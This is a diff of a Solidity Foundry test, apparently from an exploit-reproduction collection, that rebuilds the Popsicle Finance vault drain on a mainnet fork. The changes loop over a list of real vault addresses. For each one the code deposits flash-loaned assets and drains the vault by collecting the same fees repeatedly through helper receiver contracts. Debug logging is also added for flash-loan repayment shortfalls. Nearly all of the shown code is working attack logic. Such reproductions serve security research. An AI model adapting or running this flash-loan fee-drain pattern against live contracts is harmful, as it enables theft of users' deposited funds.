@@ -338,14 +338,6 @@ contract PopsicleExp is Test {
     TokenVault receiver1;
     TokenVault receiver2;
 
-    address _wethusdtVault = 0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48;
-    address _wethusdcVault = 0xd63b340F6e9CCcF0c997c83C8d036fa53B113546;
-    address _wbtcwethVault = 0xd63b340F6e9CCcF0c997c83C8d036fa53B113546;
-    address _wethusdtVault2 = 0x98d149e227C75D38F623A9aa9F030fB222B3FAa3;
-    address _wbtcusdcVault = 0xB53Dc33Bb39efE6E9dB36d7eF290d6679fAcbEC7;
-    address _daiwethVault = 0xDD90112eAF865E4E0030000803ebBb4d84F14617;
-    address _uniwethVault = 0xE22EACaC57A1ADFa38dCA1100EF17654E91EFd35;
-
     //Asset addrs
     address _usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
     address _weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
@@ -358,21 +350,15 @@ contract PopsicleExp is Test {
     uint256 usdtFlash = 30_000_000 * 1e6;
     uint256 ethFlash = 13_000 ether;
     uint256 wbtcFlash = 1400 * 1e8;
-    uint256 usdcFlash = usdtFlash;
+    uint256 usdcFlash = 30_000_000 * 1e6;
     uint256 daiFlash = 3_000_000 ether;
     uint256 uniFlash = 200_000 ether;
 
     address[] assetsArr;
+    address[] vaultsArr;
+
     uint256[] amountsArr;
     uint256[] modesArr;
-
-    IPopsicle wethusdtVault = IPopsicle(_wethusdtVault);
-    IPopsicle wethusdcVault = IPopsicle(_wethusdcVault);
-    IPopsicle wbtcwethVault = IPopsicle(_wbtcwethVault);
-    IPopsicle wethusdtVault2 = IPopsicle(_wethusdtVault2);
-    IPopsicle wbtcusdcVault = IPopsicle(_wbtcusdcVault);
-    IPopsicle daiwethVault = IPopsicle(_daiwethVault);
-    IPopsicle uniwethVault = IPopsicle(_uniwethVault);
 
     IERC20 usdt = IERC20(_usdt);
     IERC20 weth = IERC20(_weth);
@@ -384,13 +370,23 @@ contract PopsicleExp is Test {
     IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 12_955_060); //fork gnosis at block number 21120319
+        vm.createSelectFork("mainnet", 12_955_000); //fork gnosis at block number 21120319
 
         receiver1 = new TokenVault();
         receiver2 = new TokenVault();
         modesArr = [0, 0, 0, 0, 0, 0];
         assetsArr = [_usdt, _weth, _wbtc, _usdc, _dai, _uni];
         amountsArr = [usdtFlash, ethFlash, wbtcFlash, usdcFlash, daiFlash, uniFlash];
+        vaultsArr = [
+            0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48,
+            0xd63b340F6e9CCcF0c997c83C8d036fa53B113546,
+            0x0A8143EF65b0CE4C2fAD195165ef13772ff6Cca0,
+            0x98d149e227C75D38F623A9aa9F030fB222B3FAa3,
+            0xB53Dc33Bb39efE6E9dB36d7eF290d6679fAcbEC7,
+            0x6f3F35a268B3af45331471EABF3F9881b601F5aA,
+            0xDD90112eAF865E4E0030000803ebBb4d84F14617,
+            0xE22EACaC57A1ADFa38dCA1100EF17654E91EFd35
+        ];
     }
 
     function approveToTargetAll(address _target) internal {
@@ -422,20 +418,7 @@ contract PopsicleExp is Test {
     function approveFunds() internal {
         //Approve funds to be taken back after flashloan
         approveToTargetAll(address(aaveV2));
-        approveToTarget(_weth, _wethusdtVault);
-        approveToTarget(_usdt, _wethusdtVault);
-        approveToTarget(_weth, _wethusdcVault);
-        approveToTarget(_usdc, _wethusdcVault);
-        approveToTarget(_wbtc, _wbtcwethVault);
-        approveToTarget(_weth, _wbtcwethVault);
-        approveToTarget(_weth, _wethusdtVault2);
-        approveToTarget(_usdt, _wethusdtVault2);
-        approveToTarget(_wbtc, _wbtcusdcVault);
-        approveToTarget(_usdc, _wbtcusdcVault);
-        approveToTarget(_dai, _daiwethVault);
-        approveToTarget(_weth, _daiwethVault);
-        approveToTarget(_uni, _uniwethVault);
-        approveToTarget(_weth, _uniwethVault);
+
         approveToTarget(_weth, address(router));
     }
 
@@ -467,6 +450,13 @@ contract PopsicleExp is Test {
             uint256 missingAmt = bal >= (amounts[i] + premiums[i]) ? 0 : (amounts[i] + premiums[i]) - bal;
             address asset = assets[i];
             if (missingAmt > 0) {
+                if (missingAmt == premiums[i]) {
+                    console.log("we are missing a premium of %d for asset %d", missingAmt, i);
+                } else if (missingAmt > premiums[i]) {
+                    console.log("we are missing tokens itself for %d", i);
+                } else if (missingAmt != premiums[i]) {
+                    console.log("missing %d asset of %d", missingAmt, i);
+                }
                 //We just swap,figure out why we are less here,maybe flashloan fees put  us lower?
                 router.swapExactTokensForTokens(
                     router.getAmountsIn(missingAmt, getPath(_weth, asset))[0],
@@ -486,27 +476,16 @@ contract PopsicleExp is Test {
 
     function attackLogic() internal {
         approveFunds();
-
-        wethusdtVault.deposit(weth.balanceOf(address(this)), usdt.balanceOf(address(this)));
-        drainVault(_wethusdtVault);
-
-        wethusdcVault.deposit(usdcFlash, weth.balanceOf(address(this)));
-        drainVault(_wethusdcVault);
-
-        wbtcwethVault.deposit(wbtcFlash, weth.balanceOf(address(this)));
-        drainVault(_wbtcwethVault);
-
-        wethusdtVault2.deposit(weth.balanceOf(address(this)), usdtFlash - 1);
-        drainVault(_wethusdtVault2);
-
-        wbtcusdcVault.deposit(wbtcFlash - 1, usdc.balanceOf(address(this)));
-        drainVault(_wbtcusdcVault);
-
-        daiwethVault.deposit(daiFlash, weth.balanceOf(address(this)));
-        drainVault(_daiwethVault);
-
-        uniwethVault.deposit(uniFlash, weth.balanceOf(address(this)));
-        drainVault(_uniwethVault);
+        for (uint256 i = 0; i < vaultsArr.length; i++) {
+            //Approve funds for vault
+            IPopsicle vault = IPopsicle(vaultsArr[i]);
+            IERC20(vault.token0()).forceApprove(vaultsArr[i], type(uint256).max);
+            IERC20(vault.token1()).forceApprove(vaultsArr[i], type(uint256).max);
+            vault.deposit(
+                IERC20(vault.token0()).balanceOf(address(this)), IERC20(vault.token1()).balanceOf(address(this))
+            );
+            drainVault(vaultsArr[i]);
+        }
 
         claimFundsFromReceivers();
     }
@@ -531,18 +510,21 @@ contract PopsicleExp is Test {
 
     function claimFees(address _vault) internal {
         (uint256 token0fees, uint256 token1fees,,) = IPopsicle(_vault).userInfo(address(this));
-        (uint256 token0feesr1, uint256 token1feesr1,,) = IPopsicle(_vault).userInfo(address(receiver1));
-        (uint256 token0feesr2, uint256 token1feesr2,,) = IPopsicle(_vault).userInfo(address(receiver2));
 
         //Collect fees
         IPopsicle(_vault).collectFees(token0fees, token1fees);
         IPopsicle(_vault).withdraw(IPopsicle(_vault).balanceOf(address(this)));
+        (uint256 token0feesr1, uint256 token1feesr1,,) = IPopsicle(_vault).userInfo(address(receiver1));
 
         console.log("claimed initial fees success");
         receiver1.executeCall(
             _vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr1, token1feesr1)
         );
         console.log("claimed recievcer1 fees success");
+        (uint256 token0feesr2, uint256 token1feesr2) = (
+            IERC20(address(IPopsicle(_vault).token0())).balanceOf(_vault),
+            IERC20(address(IPopsicle(_vault).token1())).balanceOf(_vault)
+        );
 
         receiver2.executeCall(
             _vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr2, token1feesr2)
